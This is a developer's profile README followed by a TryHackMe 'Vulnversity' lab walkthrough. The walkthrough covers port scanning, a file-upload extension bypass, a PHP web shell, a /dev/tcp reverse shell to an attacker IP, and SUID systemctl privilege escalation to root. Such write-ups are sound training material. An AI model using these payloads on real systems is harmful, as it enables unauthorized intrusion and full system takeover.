# Dileshwar Lahre

💻 MERN Stack Developer | 🛡️ Cyber
security Enthusiast | 🎯 OSCP Aspirant

- 🔧 Currently building secure, fullstack applications with React & Node.js  
- 🧠 Learning offensive security & solving labs on TryHackMe + Hack The Box  
- 📂 Portfolio: [view My Portfolio](https://portfolio-five-psi-26.vercel.app/)  
- ✉️ Email: dileshwarlahre806@gmail.com  
- 🤝 Open to collaborate in development or security research projects  
---
> “I build with security in mind, and break to understand the foundation.”
# TryHackMe - Vulnversity

> Difficulty: Easy  
> Tags: Enumeration, Exploitation, File Upload, SUID, Privilege Escalation

---

## 1. Nmap Scan

```bash
nmap -sC -sV -oN vulnversity.nmap 10.10.XX.XX
```

**Ports Found:**
```
21/tcp   open  ftp           vsftpd 3.0.3
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu
139/tcp  open  netbios-ssn   Samba smbd 3.X
445/tcp  open  microsoft-ds  Samba smbd 3.X
3128/tcp open  squid-http    Squid http proxy 3.5.27
3333/tcp open  http          Apache httpd
```

---

## 2. Web Enumeration

**URL:** http://10.10.XX.XX:3333

```bash
gobuster dir -u http://10.10.XX.XX:3333 -w /usr/share/wordlists/dirb/common.txt
```

**Found `/internal/` folder**  
It had a **file upload page**.

Tried uploading `.php` — failed  
Tried `.phtml` — success!

![Upload Page](link-to-screenshot-1)

---

## 3. Reverse Shell Upload

Used this PHP shell:

```php
<?php system($_GET['cmd']); ?>
```

Saved as: `shell.phtml` and uploaded.

Found shell at:

```
http://10.10.XX.XX/internal/uploads/shell.phtml?cmd=whoami
```

To get a reverse shell:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.9.XX.XX/4444 0>&1'"); ?>
```

Start listener:

```bash
nc -lvnp 4444
```

![Reverse Shell Upload](link-to-screenshot-2)

---

## 4. Shell Access

Got shell as `www-data`. Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 5. Privilege Escalation

Check SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Found:  
```
/bin/systemctl
```

---

## 6. Exploiting SUID systemctl

```bash
mkdir -p /tmp/rootme && cd /tmp/rootme
echo -e '#!/bin/bash\nbash -i' > root.sh
chmod +x root.sh

echo -e '[Unit]\nDescription=RootMe\n[Service]\nType=simple\nExecStart=/tmp/rootme/root.sh\n[Install]\nWantedBy=multi-user.target' > root.service

/bin/systemctl link /tmp/rootme/root.service
/bin/systemctl enable --now rootme.service
```

Now check:

```bash
whoami
# root
```

![Privilege Escalation](link-to-screenshot-3)

---

## 7. Root Flag

```bash
cat /root/root.txt
```

---

## 8. THM Questions Answer

- **CVE full form:** Common Vulnerabilities and Exposures
- **Hidden directory:** internal
- **User flag:** /home/ubuntu/user.txt
- **Root flag:** /root/root.txt

---

## Rooted!
